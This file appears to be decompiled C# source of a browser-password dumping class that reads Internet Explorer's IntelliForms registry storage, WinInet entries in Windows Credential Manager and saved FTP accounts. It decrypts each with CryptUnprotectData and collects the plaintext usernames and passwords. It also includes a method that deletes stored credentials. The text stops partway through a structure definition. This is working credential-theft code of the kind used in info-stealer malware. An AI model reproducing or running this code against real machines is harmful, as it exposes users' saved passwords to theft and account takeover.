using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace BrowserPasswords
{
	// Token: 0x02000011 RID: 17
	internal class CIE7Passwords : CUtils, IEnumerable<CIE7Password>
	{
		// Token: 0x060000EE RID: 238 RVA: 0x000029E8 File Offset: 0x00000BE8
		public CIE7Passwords()
		{
			this.m_IEPass = new List<CIE7Password>();
		}

		// Token: 0x060000EF RID: 239
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int FileTimeToLocalFileTime(ref CIE7Passwords.FILETIME lpFileTime, ref CIE7Passwords.FILETIME lpLocalFileTime);

		// Token: 0x060000F0 RID: 240
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int FileTimeToSystemTime(ref CIE7Passwords.FILETIME lpFileTime, ref CIE7Passwords.SYSTEMTIME lpSystemTime);

		// Token: 0x060000F1 RID: 241
		[DllImport("wininet.dll", CharSet = CharSet.Ansi, EntryPoint = "FindFirstUrlCacheEntryA", ExactSpelling = true, SetLastError = true)]
		private static extern int FindFirstUrlCacheEntry([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszUrlSearchPattern, IntPtr lpFirstCacheEntryInfo, ref int lpdwFirstCacheEntryInfoBufferSize);

		// Token: 0x060000F2 RID: 242
		[DllImport("wininet.dll", CharSet = CharSet.Ansi, EntryPoint = "FindNextUrlCacheEntryA", ExactSpelling = true, SetLastError = true)]
		private static extern int FindNextUrlCacheEntry(int hEnum, IntPtr lpFirstCacheEntryInfo, ref int lpdwFirstCacheEntryInfoBufferSize);

		// Token: 0x060000F3 RID: 243
		[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int FindCloseUrlCache(int hEnumHandle);

		// Token: 0x060000F4 RID: 244
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int lstrlenA(IntPtr lpString);

		// Token: 0x060000F5 RID: 245
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int lstrcpyA([MarshalAs(UnmanagedType.VBByRefStr)] ref string RetVal, IntPtr ptr);

		// Token: 0x060000F6 RID: 246
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CryptAcquireContextA", ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr CryptAcquireContext(ref IntPtr phProv, IntPtr pszContainer, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszProvider, int dwProvType, int dwFlags);

		// Token: 0x060000F7 RID: 247
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptCreateHash(IntPtr hProv, int Algid, IntPtr hKey, int dwFlags, ref IntPtr phHash);

		// Token: 0x060000F8 RID: 248
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptHashData(IntPtr hHash, IntPtr pbData, int dwDataLen, int dwFlags);

		// Token: 0x060000F9 RID: 249
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptGetHashParam(IntPtr hHash, int dwParam, IntPtr pByte, ref int pdwDataLen, int dwFlags);

		// Token: 0x060000FA RID: 250
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptGetHashParam(IntPtr hHash, int dwParam, [MarshalAs(UnmanagedType.LPArray)] ref byte[] pByte, ref int pdwDataLen, int dwFlags);

		// Token: 0x060000FB RID: 251
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CryptSignHashA", ExactSpelling = true, SetLastError = true)]
		private static extern int CryptSignHash(IntPtr hHash, int dwKeySpec, int sDescription, int dwFlags, int pbSignature, ref int pdwSigLen);

		// Token: 0x060000FC RID: 252
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptDestroyHash(IntPtr hHash);

		// Token: 0x060000FD RID: 253
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptReleaseContext(IntPtr hProv, int dwFlags);

		// Token: 0x060000FE RID: 254
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "RegOpenKeyExA", ExactSpelling = true, SetLastError = true)]
		private static extern int RegOpenKeyEx(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSubKey, int ulOptions, int samDesired, ref int phkResult);

		// Token: 0x060000FF RID: 255
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "RegQueryValueExA", ExactSpelling = true, SetLastError = true)]
		private static extern int RegQueryValueEx(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName, int lpReserved, ref int lpType, IntPtr lpData, ref int lpcbData);

		// Token: 0x06000100 RID: 256
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "RegDeleteValueA", ExactSpelling = true, SetLastError = true)]
		private static extern int RegDeleteValue(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName);

		// Token: 0x06000101 RID: 257
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int LocalFree(IntPtr hMem);

		// Token: 0x06000102 RID: 258
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int RegCloseKey(int hKey);

		// Token: 0x06000103 RID: 259
		[DllImport("crypt32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptUnprotectData(ref CIE7Passwords.DATA_BLOB pDataIn, IntPtr ppszDataDescr, IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, ref CIE7Passwords.DATA_BLOB pDataOut);

		// Token: 0x06000104 RID: 260
		[DllImport("crypt32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptUnprotectData(ref CIE7Passwords.DATA_BLOB pDataIn, IntPtr ppszDataDescr, ref CIE7Passwords.DATA_BLOB pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, ref CIE7Passwords.DATA_BLOB pDataOut);

		// Token: 0x06000105 RID: 261
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CredEnumerateW", ExactSpelling = true, SetLastError = true)]
		private static extern int CredEnumerate([MarshalAs(UnmanagedType.LPWStr)] string lpszFilter, int lFlags, ref int pCount, ref int lppCredentials);

		// Token: 0x06000106 RID: 262
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CredDeleteW", ExactSpelling = true, SetLastError = true)]
		private static extern int CredDelete([MarshalAs(UnmanagedType.LPWStr)] string lpwstrTargetName, int dwType, int dwFlags);

		// Token: 0x06000107 RID: 263
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CredFree(int pBuffer);

		// Token: 0x06000108 RID: 264
		[DllImport("oleaut32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern string SysAllocString(int pOlechar);

		// Token: 0x06000109 RID: 265 RVA: 0x000029FC File Offset: 0x00000BFC
		private string GetStrFromPtrA(IntPtr lpszA)
		{
			return Marshal.PtrToStringAnsi(lpszA);
		}

		// Token: 0x0600010A RID: 266 RVA: 0x00002A14 File Offset: 0x00000C14
		private byte CheckSum(ref string s)
		{
			int num = 0;
			int num2 = 1;
			int num3 = Strings.Len(s);
			checked
			{
				for (int i = num2; i <= num3; i += 2)
				{
					num += (int)Math.Round(Conversion.Val("&H" + Strings.Mid(s, i, 2)));
				}
				return (byte)(num % 256);
			}
		}

		// Token: 0x0600010B RID: 267 RVA: 0x00002A64 File Offset: 0x00000C64
		private string GetSHA1Hash(ref byte[] pbData)
		{
			checked
			{
				pbData = (byte[])Utils.CopyArray((Array)pbData, new byte[pbData.Length + 1 + 1]);
				byte[] array = SHA1.Create().ComputeHash(pbData);
				string text = "";
				int num = 0;
				int num2 = array.Length - 1;
				for (int i = num; i <= num2; i++)
				{
					text += Strings.Right("00" + Conversion.Hex(array[i]), 2);
				}
				return text;
			}
		}

		// Token: 0x0600010C RID: 268 RVA: 0x00002AD8 File Offset: 0x00000CD8
		private DateTime FileTimeToDate(ref CIE7Passwords.FILETIME ftDateTime)
		{
			CIE7Passwords.FileTimeToLocalFileTime(ref ftDateTime, ref this.$STATIC$FileTimeToDate$201112110114C$lft);
			CIE7Passwords.FileTimeToSystemTime(ref this.$STATIC$FileTimeToDate$201112110114C$lft, ref this.$STATIC$FileTimeToDate$201112110114C$lst);
			return DateTime.FromOADate(DateAndTime.DateSerial((int)this.$STATIC$FileTimeToDate$201112110114C$lst.wYear, (int)this.$STATIC$FileTimeToDate$201112110114C$lst.wMonth, (int)this.$STATIC$FileTimeToDate$201112110114C$lst.wDay).ToOADate() + DateAndTime.TimeSerial((int)this.$STATIC$FileTimeToDate$201112110114C$lst.wHour, (int)this.$STATIC$FileTimeToDate$201112110114C$lst.wMinute, (int)this.$STATIC$FileTimeToDate$201112110114C$lst.wSecond).ToOADate());
		}

		// Token: 0x0600010D RID: 269 RVA: 0x00002B68 File Offset: 0x00000D68
		private void ProcessIEPass(string strURL, string strHash, CIE7Passwords.DATA_BLOB dataOut)
		{
			CIE7Passwords.StringIndexEntry stringIndexEntry;
			int num = Strings.Len(stringIndexEntry);
			CIE7Passwords.StringIndexHeader stringIndexHeader;
			int num2 = Strings.Len(stringIndexHeader);
			checked
			{
				IntPtr ptr = new IntPtr(dataOut.pbData.ToInt64() + (long)(unchecked((ulong)Marshal.ReadByte(dataOut.pbData))));
				object obj = Marshal.PtrToStructure(ptr, stringIndexHeader.GetType());
				CIE7Passwords.StringIndexHeader stringIndexHeader2;
				stringIndexHeader = ((obj != null) ? ((CIE7Passwords.StringIndexHeader)obj) : stringIndexHeader2);
				if (stringIndexHeader.dwType == 1)
				{
					if (stringIndexHeader.dwEntriesCount >= 2)
					{
						IntPtr intPtr = new IntPtr(ptr.ToInt32() + stringIndexHeader.dwStructSize);
						IntPtr value = new IntPtr(intPtr.ToInt32() + stringIndexHeader.dwEntriesCount * num);
						int num3 = 0;
						int num4 = stringIndexHeader.dwEntriesCount - 1;
						for (int i = num3; i <= num4; i += 2)
						{
							if (value == IntPtr.Zero | intPtr == IntPtr.Zero)
							{
								break;
							}
							object obj2 = Marshal.PtrToStructure(intPtr, stringIndexEntry.GetType());
							CIE7Passwords.StringIndexEntry stringIndexEntry2;
							stringIndexEntry = ((obj2 != null) ? ((CIE7Passwords.StringIndexEntry)obj2) : stringIndexEntry2);
							IntPtr intPtr2 = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
							IntPtr intPtr3;
							string szUserName;
							if (CIE7Passwords.lstrlenA(intPtr2) != stringIndexEntry.dwDataSize)
							{
								intPtr3 = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
								szUserName = Marshal.PtrToStringUni(intPtr3);
							}
							else
							{
								intPtr3 = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
								szUserName = Marshal.PtrToStringAnsi(intPtr3);
							}
							intPtr = new IntPtr(intPtr.ToInt32() + num);
							object obj3 = Marshal.PtrToStructure(intPtr, stringIndexEntry.GetType());
							stringIndexEntry = ((obj3 != null) ? ((CIE7Passwords.StringIndexEntry)obj3) : stringIndexEntry2);
							string szPasswd = Strings.Space(stringIndexEntry.dwDataSize);
							intPtr3 = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
							if (CIE7Passwords.lstrlenA(intPtr3) != stringIndexEntry.dwDataSize)
							{
								intPtr2 = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
								szPasswd = Marshal.PtrToStringUni(intPtr2);
							}
							else
							{
								intPtr3 = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
								szPasswd = Marshal.PtrToStringAnsi(intPtr3);
							}
							intPtr = new IntPtr(intPtr.ToInt32() + num);
							this.m_IEPass.Add(new CIE7Password(strHash, strURL, szUserName, szPasswd, this.FileTimeToDate(ref stringIndexEntry.ftInsertDateTime), 1, string.Empty));
						}
					}
				}
				else if (stringIndexHeader.dwType == 0)
				{
					IntPtr intPtr = new IntPtr(ptr.ToInt32() + stringIndexHeader.dwStructSize);
					IntPtr value = new IntPtr(intPtr.ToInt32() + stringIndexHeader.dwEntriesCount * num);
					if (!(value == IntPtr.Zero | intPtr == IntPtr.Zero))
					{
						int num5 = 0;
						int num6 = stringIndexHeader.dwEntriesCount - 1;
						for (int j = num5; j <= num6; j++)
						{
							object obj4 = Marshal.PtrToStructure(intPtr, stringIndexEntry.GetType());
							CIE7Passwords.StringIndexEntry stringIndexEntry2;
							stringIndexEntry = ((obj4 != null) ? ((CIE7Passwords.StringIndexEntry)obj4) : stringIndexEntry2);
							string szUserName = Strings.Space(stringIndexEntry.dwDataSize);
							IntPtr intPtr3 = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
							if (CIE7Passwords.lstrlenA(intPtr3) != stringIndexEntry.dwDataSize)
							{
								IntPtr intPtr2 = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
								szUserName = Marshal.PtrToStringUni(intPtr2);
							}
							else
							{
								intPtr3 = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
								szUserName = Marshal.PtrToStringAnsi(intPtr3);
							}
							intPtr = new IntPtr(intPtr.ToInt32() + num);
							this.m_IEPass.Add(new CIE7Password(strHash, strURL, szUserName, string.Empty, this.FileTimeToDate(ref stringIndexEntry.ftInsertDateTime), 0, string.Empty));
						}
					}
				}
			}
		}

		// Token: 0x0600010E RID: 270 RVA: 0x00002F24 File Offset: 0x00001124
		private void AddPasswdInfo(string strRess, int hKey)
		{
			strRess = Strings.LCase(strRess);
			byte[] bytes = Encoding.Unicode.GetBytes(strRess);
			string text = this.GetSHA1Hash(ref bytes);
			text += Strings.Right("00" + Conversion.Hex(this.CheckSum(ref text)), 2);
			int num2;
			int num3;
			int num = CIE7Passwords.RegQueryValueEx(hKey, ref text, 0, ref num2, IntPtr.Zero, ref num3);
			if (num3 > 0)
			{
				IntPtr intPtr = Marshal.AllocHGlobal(num3);
				num = CIE7Passwords.RegQueryValueEx(hKey, ref text, 0, ref num2, intPtr, ref num3);
				CIE7Passwords.DATA_BLOB data_BLOB;
				data_BLOB.cbData = num3;
				data_BLOB.pbData = intPtr;
				CIE7Passwords.DATA_BLOB data_BLOB2;
				data_BLOB2.cbData = checked(Strings.Len(strRess) * 2 + 2);
				data_BLOB2.pbData = Marshal.StringToHGlobalUni(strRess);
				CIE7Passwords.DATA_BLOB dataOut;
				CIE7Passwords.CryptUnprotectData(ref data_BLOB, IntPtr.Zero, ref data_BLOB2, IntPtr.Zero, IntPtr.Zero, 0, ref dataOut);
				this.ProcessIEPass(strRess, text, dataOut);
				Marshal.FreeHGlobal(data_BLOB2.pbData);
				CIE7Passwords.LocalFree(dataOut.pbData);
			}
		}

		// Token: 0x0600010F RID: 271 RVA: 0x00003018 File Offset: 0x00001218
		public void Delete(string szResourceName)
		{
			int hKey = -2147483647;
			string text = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
			int hKey2;
			CIE7Passwords.RegOpenKeyEx(hKey, ref text, 0, 131078, ref hKey2);
			int num = CIE7Passwords.RegDeleteValue(hKey2, ref szResourceName);
			CIE7Passwords.RegCloseKey(hKey2);
			CIE7Passwords.CredDelete(szResourceName, 1, 0);
		}

		// Token: 0x06000110 RID: 272 RVA: 0x0000305C File Offset: 0x0000125C
		public void Refresh()
		{
			Regex regex = new Regex("name=\"([^\"]+)\"", RegexOptions.Compiled);
			this.m_IEPass.Clear();
			int hKey = -2147483647;
			string text = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage1";
			int num;
			CIE7Passwords.RegOpenKeyEx(hKey, ref text, 0, 131097, ref num);
			int hKey2 = -2147483647;
			text = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
			int num2;
			CIE7Passwords.RegOpenKeyEx(hKey2, ref text, 0, 131097, ref num2);
			checked
			{
				if (num2 != 0 || num != 0)
				{
					text = null;
					int num4;
					int num3 = CIE7Passwords.FindFirstUrlCacheEntry(ref text, IntPtr.Zero, ref num4);
					if (num4 > 0)
					{
						IntPtr intPtr = Marshal.AllocHGlobal(num4);
						Marshal.WriteInt32(intPtr, num4);
						text = null;
						num3 = CIE7Passwords.FindFirstUrlCacheEntry(ref text, intPtr, ref num4);
						do
						{
							CIE7Passwords.INTERNET_CACHE_ENTRY_INFO internet_CACHE_ENTRY_INFO;
							object obj = Marshal.PtrToStructure(intPtr, internet_CACHE_ENTRY_INFO.GetType());
							CIE7Passwords.INTERNET_CACHE_ENTRY_INFO internet_CACHE_ENTRY_INFO2;
							internet_CACHE_ENTRY_INFO = ((obj != null) ? ((CIE7Passwords.INTERNET_CACHE_ENTRY_INFO)obj) : internet_CACHE_ENTRY_INFO2);
							if ((internet_CACHE_ENTRY_INFO.CacheEntryType & 2097153) != 0)
							{
								string text2 = this.GetStrFromPtrA(internet_CACHE_ENTRY_INFO.lpszSourceUrlName);
								if (text2.IndexOf("?") >= 0)
								{
									text2 = text2.Substring(0, text2.IndexOf("?"));
								}
								if (Strings.InStr(text2, "@", CompareMethod.Binary) > 0)
								{
									text2 = Strings.Mid(text2, Strings.InStr(text2, "@", CompareMethod.Binary) + 1);
								}
								if (num != 0 && (internet_CACHE_ENTRY_INFO.CacheEntryType & 1) == 1)
								{
									string strFromPtrA = this.GetStrFromPtrA(internet_CACHE_ENTRY_INFO.lpHeaderInfo);
									string strFromPtrA2 = this.GetStrFromPtrA(internet_CACHE_ENTRY_INFO.lpszLocalFileName);
									if (string.IsNullOrEmpty(strFromPtrA) || !strFromPtrA.Contains("text/html"))
									{
										if (string.IsNullOrEmpty(strFromPtrA2))
										{
											goto IL_1F3;
										}
									}
									try
									{
										try
										{
											foreach (object obj2 in regex.Matches(File.ReadAllText(strFromPtrA2)))
											{
												Match match = (Match)obj2;
												this.AddPasswdInfo(match.Groups[1].Value, num);
											}
										}
										finally
										{
											IEnumerator enumerator;
											if (enumerator is IDisposable)
											{
												(enumerator as IDisposable).Dispose();
											}
										}
									}
									catch (Exception ex)
									{
									}
								}
								IL_1F3:
								this.AddPasswdInfo(text2, num);
								this.AddPasswdInfo(text2, num2);
							}
							num4 = 0;
							CIE7Passwords.FindNextUrlCacheEntry(num3, IntPtr.Zero, ref num4);
							Marshal.FreeHGlobal(intPtr);
							if (num4 > 0)
							{
								intPtr = Marshal.AllocHGlobal(num4);
								Marshal.WriteInt32(intPtr, num4);
							}
						}
						while (CIE7Passwords.FindNextUrlCacheEntry(num3, intPtr, ref num4) != 0);
						CIE7Passwords.FindCloseUrlCache(num3);
					}
					CIE7Passwords.RegCloseKey(num);
					CIE7Passwords.RegCloseKey(num2);
				}
				string lpszFilter = "Microsoft_WinInet_*";
				int num5;
				int num6;
				CIE7Passwords.CredEnumerate(lpszFilter, 0, ref num5, ref num6);
				short[] array = new short[37];
				CIE7Passwords.DATA_BLOB data_BLOB;
				CIE7Passwords.DATA_BLOB data_BLOB2;
				CIE7Passwords.DATA_BLOB data_BLOB3;
				if (num5 > 0)
				{
					int num7 = 0;
					int num8 = num5 - 1;
					for (int i = num7; i <= num8; i++)
					{
						IntPtr ptr = new IntPtr(num6 + i * 4);
						IntPtr intPtr = Marshal.ReadIntPtr(ptr);
						CIE7Passwords.CREDENTIAL credential;
						object obj3 = Marshal.PtrToStructure(intPtr, credential.GetType());
						CIE7Passwords.CREDENTIAL credential2;
						credential = ((obj3 != null) ? ((CIE7Passwords.CREDENTIAL)obj3) : credential2);
						string text3 = this.CopyString(credential.lpstrTargetName);
						data_BLOB.cbData = 74;
						intPtr = Marshal.AllocHGlobal(74);
						string str = "abe2869f-9b47-4cd9-a358-c22904dba7f7\0";
						int num9 = 0;
						do
						{
							Marshal.WriteInt16(intPtr, num9 * 2, (short)(Strings.Asc(Strings.Mid(str, num9 + 1, 1)) * 4));
							num9++;
						}
						while (num9 <= 36);
						data_BLOB.pbData = intPtr;
						data_BLOB2.pbData = credential.lpbCredentialBlob;
						data_BLOB2.cbData = credential.dwCredentialBlobSize;
						data_BLOB3.cbData = 0;
						data_BLOB3.pbData = IntPtr.Zero;
						CIE7Passwords.CryptUnprotectData(ref data_BLOB2, IntPtr.Zero, ref data_BLOB, IntPtr.Zero, IntPtr.Zero, 0, ref data_BLOB3);
						Marshal.FreeHGlobal(intPtr);
						string expression = Marshal.PtrToStringUni(data_BLOB3.pbData);
						string[] array2 = Strings.Split(expression, ":", -1, CompareMethod.Binary);
						int num10 = Strings.InStr(Strings.Mid(text3, 19), "/", CompareMethod.Binary);
						if (num10 > 0)
						{
							this.m_IEPass.Add(new CIE7Password(text3, Strings.Mid(text3, 19, num10 - 1), array2[0], array2[1], DateTime.MinValue, 2, Strings.Mid(text3, 19 + num10)));
						}
						else
						{
							this.m_IEPass.Add(new CIE7Password(text3, Strings.Mid(text3, 19), array2[0], array2[1], DateTime.MinValue, 2, string.Empty));
						}
						CIE7Passwords.LocalFree(data_BLOB3.pbData);
					}
				}
				CIE7Passwords.CredFree(num6);
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\FTP\\Accounts");
				if (registryKey != null)
				{
					foreach (string text4 in registryKey.GetSubKeyNames())
					{
						RegistryKey registryKey2 = registryKey.OpenSubKey(text4);
						foreach (string text5 in registryKey2.GetSubKeyNames())
						{
							RegistryKey registryKey3 = registryKey2.OpenSubKey(text5);
							byte[] array3 = (byte[])registryKey3.GetValue("Password");
							byte[] array4 = new byte[4];
							int num11 = 0;
							int num12 = text4.Length - 1;
							for (int l = num11; l <= num12; l++)
							{
								byte b = (byte)(text4[l] & '\u001f');
								array4[l & 3] = unchecked(array4[l & 3] + b);
							}
							data_BLOB2.cbData = array3.Length;
							data_BLOB2.pbData = Marshal.AllocHGlobal(array3.Length);
							Marshal.Copy(array3, 0, data_BLOB2.pbData, array3.Length);
							data_BLOB3.cbData = 0;
							data_BLOB3.pbData = IntPtr.Zero;
							GCHandle gchandle = GCHandle.Alloc(array4, GCHandleType.Pinned);
							data_BLOB.pbData = gchandle.AddrOfPinnedObject();
							data_BLOB.cbData = 4;
							CIE7Passwords.CryptUnprotectData(ref data_BLOB2, IntPtr.Zero, ref data_BLOB, IntPtr.Zero, IntPtr.Zero, 0, ref data_BLOB3);
							gchandle.Free();
							this.m_IEPass.Add(new CIE7Password(text4, string.Format("ftp://{0}@{1}/", text4, text5), text5, Marshal.PtrToStringUni(data_BLOB3.pbData), DateTime.MinValue, 3, string.Empty));
							CIE7Passwords.LocalFree(data_BLOB3.pbData);
						}
					}
				}
			}
		}

		// Token: 0x06000111 RID: 273 RVA: 0x00003670 File Offset: 0x00001870
		public IEnumerator<CIE7Password> GetEnumerator()
		{
			this.Refresh();
			return (IEnumerator<CIE7Password>)this.m_IEPass.GetEnumerator();
		}

		// Token: 0x06000112 RID: 274 RVA: 0x0000369C File Offset: 0x0000189C
		public IEnumerator GetEnumerator1()
		{
			this.Refresh();
			return (IEnumerator)this.m_IEPass.GetEnumerator();
		}

		// Token: 0x04000081 RID: 129
		private const int ERROR_CACHE_FIND_FAIL = 0;

		// Token: 0x04000082 RID: 130
		private const int ERROR_CACHE_FIND_SUCCESS = 1;

		// Token: 0x04000083 RID: 131
		private const int MAX_PATH = 260;

		// Token: 0x04000084 RID: 132
		private const int MAX_CACHE_ENTRY_INFO_SIZE = 4096;

		// Token: 0x04000085 RID: 133
		private const int NORMAL_CACHE_ENTRY = 1;

		// Token: 0x04000086 RID: 134
		private const int URLHISTORY_CACHE_ENTRY = 2097152;

		// Token: 0x04000087 RID: 135
		private const int PROV_RSA_FULL = 1;

		// Token: 0x04000088 RID: 136
		private const int ALG_CLASS_HASH = 32768;

		// Token: 0x04000089 RID: 137
		private const int ALG_TYPE_ANY = 0;

		// Token: 0x0400008A RID: 138
		private const int ALG_SID_SHA = 4;

		// Token: 0x0400008B RID: 139
		private const int CALG_SHA = 32772;

		// Token: 0x0400008C RID: 140
		private const int AT_SIGNATURE = 2;

		// Token: 0x0400008D RID: 141
		private const int HP_HASHVAL = 2;

		// Token: 0x0400008E RID: 142
		private const int READ_CONTROL = 131072;

		// Token: 0x0400008F RID: 143
		private const int STANDARD_RIGHTS_READ = 131072;

		// Token: 0x04000090 RID: 144
		private const int KEY_QUERY_VALUE = 1;

		// Token: 0x04000091 RID: 145
		private const int KEY_ENUMERATE_SUB_KEYS = 8;

		// Token: 0x04000092 RID: 146
		private const int KEY_NOTIFY = 16;

		// Token: 0x04000093 RID: 147
		private const int SYNCHRONIZE = 1048576;

		// Token: 0x04000094 RID: 148
		private const int STANDARD_RIGHTS_WRITE = 131072;

		// Token: 0x04000095 RID: 149
		private const int KEY_SET_VALUE = 2;

		// Token: 0x04000096 RID: 150
		private const int KEY_CREATE_SUB_KEY = 4;

		// Token: 0x04000097 RID: 151
		private const int KEY_READ = 131097;

		// Token: 0x04000098 RID: 152
		private const int KEY_WRITE = 131078;

		// Token: 0x04000099 RID: 153
		private const int HKEY_CURRENT_USER = -2147483647;

		// Token: 0x0400009A RID: 154
		private List<CIE7Password> m_IEPass;

		// Token: 0x0400009B RID: 155
		private CIE7Passwords.SYSTEMTIME $STATIC$FileTimeToDate$201112110114C$lst;

		// Token: 0x0400009C RID: 156
		private CIE7Passwords.FILETIME $STATIC$FileTimeToDate$201112110114C$lft;

		// Token: 0x02000012 RID: 18
		private struct SYSTEMTIME
		{
			// Token: 0x0400009D RID: 157
			public short wYear;

			// Token: 0x0400009E RID: 158
			public short wMonth;

			// Token: 0x0400009F RID: 159
			public short wDayOfWeek;

			// Token: 0x040000A0 RID: 160
			public short wDay;

			// Token: 0x040000A1 RID: 161
			public short wHour;

			// Token: 0x040000A2 RID: 162
			public short wMinute;

			// Token: 0x040000A3 RID: 163
			public short wSecond;

			// Token: 0x040000A4 RID: 164
			public short wMilliseconds;
		}

		// Token: 0x02000013 RID: 19
		private struct FILETIME
		{
			// Token: 0x040000A5 RID: 165
			public int dwLowDateTime;

			// Token: 0x040000A6 RID: 166
			public int dwHighDateTime;
		}

		// Token: 0x02000014 RID: 20
		private struct INTERNET_CACHE_ENTRY_INFO
		{
			// Token: 0x040000A7 RID: 167
			public int dwStructSize;

			// Token: 0x040000A8 RID: 168
			public IntPtr lpszSourceUrlName;

			// Token: 0x040000A9 RID: 169
			public IntPtr lpszLocalFileName;

			// Token: 0x040000AA RID: 170
			public int CacheEntryType;

			// Token: 0x040000AB RID: 171
			public int dwUseCount;

			// Token: 0x040000AC RID: 172
			public int dwHitRate;

			// Token: 0x040000AD RID: 173
			public int dwSizeLow;

			// Token: 0x040000AE RID: 174
			public int dwSizeHigh;

			// Token: 0x040000AF RID: 175
			public CIE7Passwords.FILETIME LastModifiedTime;

			// Token: 0x040000B0 RID: 176
			public CIE7Passwords.FILETIME ExpireTime;

			// Token: 0x040000B1 RID: 177
			public CIE7Passwords.FILETIME LastAccessTime;

			// Token: 0x040000B2 RID: 178
			public CIE7Passwords.FILETIME LastSyncTime;

			// Token: 0x040000B3 RID: 179
			public IntPtr lpHeaderInfo;

			// Token: 0x040000B4 RID: 180
			public int dwHeaderInfoSize;

			// Token: 0x040000B5 RID: 181
			public IntPtr lpszFileExtension;

			// Token: 0x040000B6 RID: 182
			public int dwExemptDelta;
		}

		// Token: 0x02000015 RID: 21
		private struct DATA_BLOB
		{
			// Token: 0x040000B7 RID: 183
			public int cbData;

			// Token: 0x040000B8 RID: 184
			public IntPtr pbData;
		}

		// Token: 0x02000016 RID: 22
		private struct StringIndexHeader
		{
			// Token: 0x040000B9 RID: 185
			public int dwWICK;

			// Token: 0x040000BA RID: 186
			public int dwStructSize;

			// Token: 0x040000BB RID: 187
			public int dwEntriesCount;

			// Token: 0x040000BC RID: 188
			public int dwUnkId;

			// Token: 0x040000BD RID: 189
			public int dwType;

			// Token: 0x040000BE RID: 190
			public int dwUnk;
		}

		// Token: 0x02000017 RID: 23
		private struct StringIndexEntry
		{
			// Token: 0x040000BF RID: 191
			public int dwDataOffset;

			// Token: 0x040000C0 RID: 192
			public CIE7Passwords.FILETIME ftInsertDateTime;

			// Token: 0x040000C1 RID: 193
			public int dwDataSize;
		}

		// Token: 0x02000018 RID: 24
		private enum CRED_TYPE
		{
			// Token: 0x040000C3 RID: 195
			GENERIC = 1,
			// Token: 0x040000C4 RID: 196
			DOMAIN_PASSWORD,
			// Token: 0x040000C5 RID: 197
			DOMAIN_CERTIFICATE,
			// Token: 0x040000C6 RID: 198
			DOMAIN_VISIBLE_PASSWORD,
			// Token: 0x040000C7 RID: 199
			MAXIMUM
		}

		// Token: 0x02000019 RID: 25
		private struct CREDENTIAL_ATTRIBUTE
		{
			// Token: 0x040000C8 RID: 200
			public int lpstrKeyword;

			// Token: 0x040000C9 RID: 201
			public int dwFlags;

			// Token: 0x040000CA RID: 202
			public int dwValueSize;

			// Token: 0x040000CB RID: 203
			public int lpbValue;
		}

		// Token: 0x0200001A RID: 26
		private struct CREDENTIAL
		{
			// Token: 0x040000CC RID: 204
			public int dwFlags;

			// Token: 0x040000CD RID: 205
